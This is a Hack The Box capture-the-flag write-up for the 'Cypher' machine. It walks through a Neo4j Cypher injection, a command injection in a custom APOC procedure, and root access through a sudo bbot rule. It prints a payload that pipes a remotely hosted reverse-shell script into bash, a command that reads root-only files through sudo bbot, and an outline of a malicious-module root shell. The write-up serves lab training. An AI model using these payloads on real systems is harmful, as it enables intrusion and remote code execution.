---
title: Cypher
date: 2025-03-02
description: Medium-difficulty Linux machine focused on Neo4j Cypher injection, abuse of a vulnerable custom APOC extension for command execution, and privilege escalation through a misconfigured bbot sudo rule.
tags:
  - htb
  - Medium
  - Linux
---

# Initial Recon

Initial scan identified SSH and HTTP services exposed on the target.

```bash
PORT    STATE  SERVICE
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu)
80/tcp  open   http    Apache httpd 2.4.41 ((Ubuntu))
```

While testing the login form, appending a single quote (`'`) to the username triggered an error message, exposing backend query behavior.

Intercepting the request with Burp Suite revealed the `/api/auth` endpoint. Additional input manipulation exposed part of the underlying Neo4j query:

```text
MATCH (u:USER)-[:SECRET]->(h:SHA1)
WHERE u.name = 'admin'hi'
RETURN h.value as hash
```

The query searches for a `USER` node connected to a `SHA1` node through the `SECRET` relationship and returns the stored hash value.

## Directory Enumeration

Leveraged `feroxbuster` and discovered:

```text
http://cypher.htb/testing/
```

Inside the directory was a JAR archive:

```text
custom-apoc-extension-1.0-SNAPSHOT.jar
```

Extracting the archive revealed several compiled Java classes:

```text
custom-apoc-extension-1.0-SNAPSHOT
└── com
    └── cypher
        └── neo4j
            └── apoc
                ├── CustomFunctions.class
                ├── CustomFunctions$StringOutput.class
                ├── HellowWorldProcedure.class
                └── HellowWorldProcedure$HelloWorldOutput.class
```

# Static Analysis

The classes were decompiled using `jadx`.

```bash
sudo apt install default-jdk
jadx -d ~/HTB/cypher/decompiled ~/HTB/cypher/CustomFunctions.class
```

Reviewing the source exposed a custom Neo4j procedure:

```java
@Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
@Description("Returns the HTTP status code for the given URL as a string")
```

The vulnerable implementation executed a shell command directly with user-controlled input:

```java
String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```

The procedure simply calls `curl`, captures the returned HTTP status code, and outputs the result. Since the supplied URL is concatenated into a shell command without sanitization, command injection becomes possible.

## Cypher Injection

`Cypher` is the query language used by Neo4j graph databases, where data is represented as nodes and relationships rather than traditional tables and columns.

A crafted Cypher injection payload allowed execution of the vulnerable procedure:

```json
{"username":"a' OR 1=1 WITH 1 as _l00 CALL custom.getUrlStatusCode('http://10.10.14.2/$(curl http://10.10.14.2:8020/revshell.sh | bash)') YIELD statusCode RETURN statusCode; //","password":"password"}
```

The payload abuses:

- A Cypher injection primitive to alter the original query.
- The `CALL` expression to invoke the custom procedure.
- Command substitution through the vulnerable `curl` execution path.
- A hosted reverse shell script fetched and executed from the attacker's machine.

After injecting the payload through the vulnerable field, command execution was confirmed and a reverse shell was captured as the `neo4j` user.

# User Access

Enumerating the system revealed another user:

```text
graphasm
```

Although direct access to the user flag was restricted, a readable configuration file was discovered:

```text
bbot_preset.yml
```

The file contained credentials belonging to `graphasm`, allowing lateral movement into the account.

# Root

Checking sudo permissions revealed the following rule:

```console
$ sudo -l

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Since `bbot` could be executed as root, it was possible to read arbitrary files:

```console
sudo /usr/local/bin/bbot -d --dry-scan -cy /root/root.txt
```

This exposed the root flag.

## Alternative Root Shell

Since `bbot` is Python-based and supports custom modules, a cleaner route to full root access is available.

Reference:

`https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/`

A malicious Python module can be created and executed through:

```bash
-m <module-path>
```

This results in arbitrary command execution as root and provides a full privileged shell.

Gained `root`
